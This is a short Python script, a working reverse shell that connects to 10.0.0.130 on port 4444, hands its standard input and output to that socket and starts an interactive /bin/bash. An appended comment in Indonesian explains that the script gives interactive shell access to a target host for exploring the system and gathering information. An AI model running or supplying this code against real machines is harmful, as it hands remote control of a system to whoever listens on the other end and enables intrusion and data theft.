import socket, subprocess, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.130", 4444))
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)
subprocess.call(["/bin/bash", "-i"])

# =================================================
# kesimpulan : 
# Maksud dan tujuan dari skrip ini adalah untuk membuat koneksi ke sebuah host dan port tertentu menggunakan socket. Setelah koneksi berhasil, skrip akan mengalihkan stdin (input standar), stdout (output standar), dan stderr (output error standar) dari proses saat ini ke soket yang terhubung. Akhirnya, skrip akan memulai proses shell interaktif dengan menggunakan `/bin/bash`.

# Tujuan dari skrip ini tampaknya adalah untuk mendapatkan akses shell interaktif ke host yang dituju melalui jaringan. Dengan mengalihkan input dan output standar ke soket yang terhubung, skrip memungkinkan pengguna untuk secara interaktif menjalankan perintah shell pada host target, sehingga memungkinkan untuk melakukan berbagai tindakan, seperti menjelajahi sistem, mengumpulkan informasi, atau bahkan melakukan tindakan tertentu berdasarkan akses yang diperoleh.
